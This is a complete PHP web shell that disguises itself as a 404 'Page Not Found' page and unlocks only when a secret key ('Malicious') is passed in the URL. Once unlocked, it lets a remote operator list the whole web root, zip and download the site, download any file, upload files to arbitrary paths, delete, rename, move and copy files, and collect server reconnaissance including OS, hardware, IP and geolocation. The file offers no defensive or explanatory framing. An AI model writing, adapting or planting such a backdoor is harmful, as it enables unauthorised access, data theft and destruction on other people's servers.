<?php
ini_set('memory_limit', '512M');
ini_set('max_execution_time', 300);
ini_set('post_max_size', '2G');
ini_set('upload_max_filesize', '2G');
ini_set('max_input_time', 300);

$correct_key = "Malicious";
$user_key = $_GET['key'] ?? '';

if ($user_key !== $correct_key) {
    http_response_code(404);
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f8f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #333;
        }
        .error-container {
            text-align: center;
            padding: 2rem;
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            max-width: 500px;
        }
        h1 { font-size: 6rem; margin: 0; color: #dc3545; font-weight: 300; }
        h2 { font-size: 1.5rem; margin: 0.5rem 0 1rem 0; font-weight: 400; }
        p { color: #6c757d; line-height: 1.6; }
        a { color: #007bff; text-decoration: none; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="error-container">
        <h1>404</h1>
        <h2>Page Not Found</h2>
        <p>The page you are looking for might have been removed, had its name changed, or is temporarily unavailable.</p>
        <p><a href="/">Return to Homepage</a></p>
    </div>
</body>
</html>
    <?php
    exit;
}

$root = $_SERVER['DOCUMENT_ROOT'];
$action = $_GET['action'] ?? '';

function treeBuilder($dir, $prefix = "", $isLast = true) {
    $output = "";
    $items = array_values(array_diff(scandir($dir), ['.', '..']));
    $count = count($items);
    foreach ($items as $index => $item) {
        $path = $dir . "/" . $item;
        $isDir = is_dir($path);
        $connector = ($index === $count - 1) ? "└── " : "├── ";
        $output .= $prefix . $connector . ($isDir ? "📁 " : "📄 ") . $item;
        if (!$isDir) $output .= " (" . formatSize(filesize($path)) . ")";
        $output .= "\n";
        if ($isDir) {
            $newPrefix = $prefix . ($index === $count - 1 ? "    " : "│   ");
            $output .= treeBuilder($path, $newPrefix, $index === $count - 1);
        }
    }
    return $output;
}

function formatSize($bytes) {
    if ($bytes === false || $bytes === null || $bytes < 0) return 'N/A';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($bytes >= 1024 && $i < 4) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}

function zipDownload($dir) {
    ini_set('memory_limit', '512M');
    ini_set('max_execution_time', 300);
    
    $tmpFile = tempnam(sys_get_temp_dir(), 'backup_') . '.zip';
    $zip = new ZipArchive();
    if ($zip->open($tmpFile, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
        return false;
    }
    $files = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir),
        RecursiveIteratorIterator::LEAVES_ONLY
    );
    foreach ($files as $name => $file) {
        if (!$file->isDir()) {
            $filePath = $file->getRealPath();
            $relativePath = substr($filePath, strlen($dir) + 1);
            $zip->addFile($filePath, $relativePath);
        }
    }
    $zip->close();
    if (!file_exists($tmpFile)) {
        return false;
    }
    header('Content-Type: application/zip');
    header('Content-Disposition: attachment; filename="backup_' . time() . '.zip"');
    header('Content-Length: ' . filesize($tmpFile));
    if (ob_get_level()) ob_end_clean();
    $handle = fopen($tmpFile, 'rb');
    while (!feof($handle)) {
        echo fread($handle, 1024 * 1024);
        flush();
    }
    fclose($handle);
    unlink($tmpFile);
    exit;
}

function downloadFile($filePath) {
    if (file_exists($filePath) && !is_dir($filePath)) {
        ini_set('max_execution_time', 0);
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
        header('Content-Length: ' . filesize($filePath));
        if (ob_get_level()) ob_end_clean();
        $handle = fopen($filePath, 'rb');
        while (!feof($handle)) {
            echo fread($handle, 1024 * 1024);
            flush();
        }
        fclose($handle);
        exit;
    }
    return false;
}

function uploadFile() {
    if (!isset($_FILES['file'])) {
        return "❌ No file uploaded (missing file field)";
    }
    if ($_FILES['file']['error'] !== UPLOAD_ERR_OK) {
        $errors = [
            UPLOAD_ERR_INI_SIZE => 'File exceeds upload_max_filesize',
            UPLOAD_ERR_FORM_SIZE => 'File exceeds MAX_FILE_SIZE',
            UPLOAD_ERR_PARTIAL => 'File only partially uploaded',
            UPLOAD_ERR_NO_FILE => 'No file uploaded',
            UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
            UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
            UPLOAD_ERR_EXTENSION => 'File upload stopped by extension'
        ];
        return "❌ Upload error: " . ($errors[$_FILES['file']['error']] ?? 'Unknown error');
    }
    $targetFolder = $_GET['path'] ?? '';
    $originalName = basename($_FILES['file']['name']);
    if (empty($targetFolder)) {
        $targetDir = $_SERVER['DOCUMENT_ROOT'] . "/uploads/";
        if (!is_dir($targetDir)) {
            if (!mkdir($targetDir, 0755, true)) {
                return "❌ Failed to create uploads directory";
            }
        }
        $targetFile = $targetDir . $originalName;
        if (file_exists($targetFile)) {
            $filename = time() . '_' . $originalName;
            $targetFile = $targetDir . $filename;
        }
    } else {
        $targetDir = $_SERVER['DOCUMENT_ROOT'] . '/' . rtrim($targetFolder, '/') . '/';
        if (!is_dir($targetDir)) {
            if (!mkdir($targetDir, 0755, true)) {
                return "❌ Failed to create target directory: " . $targetDir;
            }
        }
        $targetFile = $targetDir . $originalName;
        if (file_exists($targetFile)) {
            $filename = time() . '_' . $originalName;
            $targetFile = $targetDir . $filename;
        }
    }
    if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
        return "✅ File uploaded successfully!\n" .
               "📁 Name: " . basename($targetFile) . "\n" .
               "📍 Path: " . $targetFile . "\n" .
               "📦 Size: " . formatSize($_FILES['file']['size']) . "\n" .
               "🔗 URL: " . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '') . str_replace($_SERVER['DOCUMENT_ROOT'], '', $targetFile);
    } else {
        return "❌ Failed to move uploaded file. Check permissions.\n" .
               "Target: " . $targetFile . "\n" .
               "Temp: " . $_FILES['file']['tmp_name'];
    }
}

function deleteDirectory($dir) {
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) return unlink($dir);
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) return false;
    }
    return rmdir($dir);
}

function deletePath($path) {
    if (!file_exists($path)) {
        return "❌ Path does not exist: " . $path;
    }
    if (is_dir($path)) {
        if (deleteDirectory($path)) {
            return "✅ Directory deleted successfully: " . $path;
        } else {
            return "❌ Failed to delete directory: " . $path;
        }
    } elseif (is_file($path)) {
        if (unlink($path)) {
            return "✅ File deleted successfully: " . $path;
        } else {
            return "❌ Failed to delete file: " . $path;
        }
    } else {
        return "❌ Unknown path type: " . $path;
    }
}

function renamePath($old, $new) {
    if (!file_exists($old)) {
        return "❌ Source does not exist: " . $old;
    }
    if (file_exists($new)) {
        return "❌ Destination already exists: " . $new;
    }
    if (rename($old, $new)) {
        return "✅ Renamed/Moved successfully:\nOld: " . $old . "\nNew: " . $new;
    } else {
        return "❌ Failed to rename/move: " . $old . " -> " . $new;
    }
}

function movePath($from, $to) {
    if (!file_exists($from)) {
        return "❌ Source does not exist: " . $from;
    }
    if (is_dir($to)) {
        $to = rtrim($to, '/') . '/' . basename($from);
    }
    if (file_exists($to)) {
        return "❌ Destination already exists: " . $to;
    }
    if (rename($from, $to)) {
        return "✅ Moved successfully:\nFrom: " . $from . "\nTo: " . $to;
    } else {
        return "❌ Failed to move: " . $from . " -> " . $to;
    }
}

function copyPath($from, $to) {
    if (!file_exists($from)) {
        return "❌ Source does not exist: " . $from;
    }
    if (is_dir($to)) {
        $to = rtrim($to, '/') . '/' . basename($from);
    }
    if (file_exists($to)) {
        return "❌ Destination already exists: " . $to;
    }
    if (copy($from, $to)) {
        return "✅ Copied successfully:\nFrom: " . $from . "\nTo: " . $to;
    } else {
        return "❌ Failed to copy: " . $from . " -> " . $to;
    }
}

function getServerInfo() {
    $info = [];
    $ip = $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname());
    $info['Server IP'] = $ip;
    $info['Hostname'] = gethostname();
    $info['Server Software'] = $_SERVER['SERVER_SOFTWARE'] ?? 'N/A';
    $info['PHP Version'] = phpversion();
    $info['Operating System'] = PHP_OS . ' (' . php_uname('r') . ')';
    $info['Kernel'] = php_uname('s') . ' ' . php_uname('r') . ' ' . php_uname('m');
    if (function_exists('sys_getloadavg')) {
        $load = sys_getloadavg();
        $info['CPU Load'] = $load[0] . ' (1m) ' . $load[1] . ' (5m) ' . $load[2] . ' (15m)';
    } else {
        $info['CPU Load'] = 'N/A';
    }
    if (function_exists('exec')) {
        $cpuInfo = @shell_exec('cat /proc/cpuinfo | grep "model name" | head -1');
        if ($cpuInfo) $info['CPU Model'] = trim(str_replace('model name', '', $cpuInfo));
        $cores = @shell_exec('cat /proc/cpuinfo | grep processor | wc -l');
        if ($cores) $info['CPU Cores'] = trim($cores);
        $uptime = @shell_exec('uptime -p');
        if ($uptime) $info['Uptime'] = trim($uptime);
        else {
            $uptimeSec = @file_get_contents('/proc/uptime');
            if ($uptimeSec) {
                $sec = explode(' ', $uptimeSec)[0];
                $days = floor($sec / 86400);
                $hours = floor(($sec % 86400) / 3600);
                $minutes = floor(($sec % 3600) / 60);
                $info['Uptime'] = "$days days, $hours hours, $minutes minutes";
            }
        }
        $mem = @shell_exec('free -m | grep Mem');
        if ($mem) {
            preg_match('/\s+(\d+)\s+(\d+)\s+(\d+)/', $mem, $matches);
            if (isset($matches[1])) {
                $info['RAM Total'] = $matches[1] . ' MB';
                $info['RAM Used'] = $matches[2] . ' MB';
                $info['RAM Free'] = $matches[3] . ' MB';
            }
        }
        $disk = @shell_exec('df -h / | tail -1');
        if ($disk) {
            preg_match('/(\d+[G|M])\s+(\d+[G|M])\s+(\d+[G|M])\s+(\d+%)/', $disk, $matches);
            if (isset($matches[1])) {
                $info['Disk Total'] = $matches[1];
                $info['Disk Used'] = $matches[2];
                $info['Disk Free'] = $matches[3];
                $info['Disk Usage'] = $matches[4];
            }
        }
    }
    if (!isset($info['Disk Total'])) {
        try {
            $total = @disk_total_space('/');
            $free = @disk_free_space('/');
            if ($total !== false && $free !== false) {
                $info['Disk Total'] = formatSize($total);
                $info['Disk Free'] = formatSize($free);
                $info['Disk Used'] = formatSize($total - $free);
                $info['Disk Usage'] = round(($total - $free) / $total * 100, 2) . '%';
            }
        } catch (Exception $e) {}
    }
    $geoData = null;
    $url = "http://ip-api.com/json/$ip?fields=status,country,city,regionName,lat,lon,isp,timezone";
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        $response = curl_exec($ch);
        curl_close($ch);
        if ($response) $geoData = json_decode($response, true);
    } else {
        $response = @file_get_contents($url);
        if ($response) $geoData = json_decode($response, true);
    }
    if ($geoData && isset($geoData['status']) && $geoData['status'] == 'success') {
        $info['Country'] = $geoData['country'] ?? 'N/A';
        $info['City'] = $geoData['city'] ?? 'N/A';
        $info['Region'] = $geoData['regionName'] ?? 'N/A';
        $info['Location'] = (isset($geoData['lat']) && isset($geoData['lon'])) ? $geoData['lat'] . ',' . $geoData['lon'] : 'N/A';
        $info['ISP'] = $geoData['isp'] ?? 'N/A';
        $info['Timezone'] = $geoData['timezone'] ?? 'N/A';
    }
    $info['Memory Usage (PHP)'] = formatSize(memory_get_usage(true)) . ' (peak: ' . formatSize(memory_get_peak_usage(true)) . ')';
    $info['Current Time'] = date('Y-m-d H:i:s');
    $output = "";
    $output .= "═══════════════════════════════════════\n";
    $output .= "  🌐 SERVER INFORMATION\n";
    $output .= "═══════════════════════════════════════\n\n";
    $output .= "📡 NETWORK & LOCATION\n";
    $output .= "─────────────────────────────────────\n";
    $output .= "Server IP    : " . $info['Server IP'] . "\n";
    $output .= "Hostname     : " . $info['Hostname'] . "\n";
    if (isset($info['Country'])) $output .= "Country      : " . $info['Country'] . "\n";
    if (isset($info['City'])) $output .= "City         : " . $info['City'] . "\n";
    if (isset($info['Region'])) $output .= "Region       : " . $info['Region'] . "\n";
    if (isset($info['Location']) && $info['Location'] != 'N/A' && $info['Location'] != ',') $output .= "Coordinates  : " . $info['Location'] . "\n";
    if (isset($info['ISP'])) $output .= "ISP          : " . $info['ISP'] . "\n";
    if (isset($info['Timezone'])) $output .= "Timezone     : " . $info['Timezone'] . "\n\n";
    $output .= "🖥️  SYSTEM & HARDWARE\n";
    $output .= "─────────────────────────────────────\n";
    $output .= "OS           : " . $info['Operating System'] . "\n";
    $output .= "Kernel       : " . $info['Kernel'] . "\n";
    $output .= "Server       : " . $info['Server Software'] . "\n";
    $output .= "PHP Version  : " . $info['PHP Version'] . "\n";
    if (isset($info['CPU Model'])) $output .= "CPU Model    : " . $info['CPU Model'] . "\n";
    if (isset($info['CPU Cores'])) $output .= "CPU Cores    : " . $info['CPU Cores'] . "\n";
    $output .= "CPU Load     : " . $info['CPU Load'] . "\n";
    if (isset($info['Uptime'])) $output .= "Uptime       : " . $info['Uptime'] . "\n";
    if (isset($info['RAM Total'])) $output .= "RAM Total    : " . $info['RAM Total'] . "\n";
    if (isset($info['RAM Used'])) $output .= "RAM Used     : " . $info['RAM Used'] . "\n";
    if (isset($info['RAM Free'])) $output .= "RAM Free     : " . $info['RAM Free'] . "\n";
    if (isset($info['Disk Total'])) $output .= "Disk Total   : " . $info['Disk Total'] . "\n";
    if (isset($info['Disk Used'])) $output .= "Disk Used    : " . $info['Disk Used'] . "\n";
    if (isset($info['Disk Free'])) $output .= "Disk Free    : " . $info['Disk Free'] . "\n";
    if (isset($info['Disk Usage'])) $output .= "Disk Usage   : " . $info['Disk Usage'] . "\n";
    $output .= "Memory (PHP) : " . $info['Memory Usage (PHP)'] . "\n\n";
    $output .= "⏱️  TIME & STATUS\n";
    $output .= "─────────────────────────────────────\n";
    $output .= "Current Time : " . $info['Current Time'] . "\n";
    return $output;
}

if ($action) {
    switch ($action) {
        case 'tree':
            header('Content-Type: text/plain');
            echo "🌳 Directory Tree:\n" . treeBuilder($root);
            break;
        case 'download_all':
            zipDownload($root);
            break;
        case 'download_file':
            if (isset($_GET['path'])) {
                $filePath = $root . "/" . $_GET['path'];
                downloadFile($filePath);
                echo "❌ File not found";
            }
            break;
        case 'upload':
            header('Content-Type: text/plain');
            echo uploadFile();
            break;
        case 'delete':
            header('Content-Type: text/plain');
            if (isset($_GET['path'])) {
                $path = $root . "/" . ltrim($_GET['path'], '/');
                echo deletePath($path);
            } else {
                echo "❌ No path specified";
            }
            break;
        case 'rename':
            header('Content-Type: text/plain');
            if (isset($_GET['old']) && isset($_GET['new'])) {
                $old = $root . "/" . ltrim($_GET['old'], '/');
                $new = $root . "/" . ltrim($_GET['new'], '/');
                echo renamePath($old, $new);
            } else {
                echo "❌ Missing old or new path";
            }
            break;
        case 'move':
            header('Content-Type: text/plain');
            if (isset($_GET['from']) && isset($_GET['to'])) {
                $from = $root . "/" . ltrim($_GET['from'], '/');
                $to = $root . "/" . ltrim($_GET['to'], '/');
                echo movePath($from, $to);
            } else {
                echo "❌ Missing from or to path";
            }
            break;
        case 'copy':
            header('Content-Type: text/plain');
            if (isset($_GET['from']) && isset($_GET['to'])) {
                $from = $root . "/" . ltrim($_GET['from'], '/');
                $to = $root . "/" . ltrim($_GET['to'], '/');
                echo copyPath($from, $to);
            } else {
                echo "❌ Missing from or to path";
            }
            break;
        case 'info':
            header('Content-Type: text/plain');
            echo getServerInfo();
            break;
        default:
            http_response_code(404);
            echo "404 Not Found";
    }
    exit;
}

http_response_code(404);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f8f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #333;
        }
        .error-container {
            text-align: center;
            padding: 2rem;
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            max-width: 500px;
        }
        h1 { font-size: 6rem; margin: 0; color: #dc3545; font-weight: 300; }
        h2 { font-size: 1.5rem; margin: 0.5rem 0 1rem 0; font-weight: 400; }
        p { color: #6c757d; line-height: 1.6; }
        a { color: #007bff; text-decoration: none; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="error-container">
        <h1>404</h1>
        <h2>Page Not Found</h2>
        <p>The page you are looking for might have been removed, had its name changed, or is temporarily unavailable.</p>
        <p><a href="/">Return to Homepage</a></p>
    </div>
</body>
</html>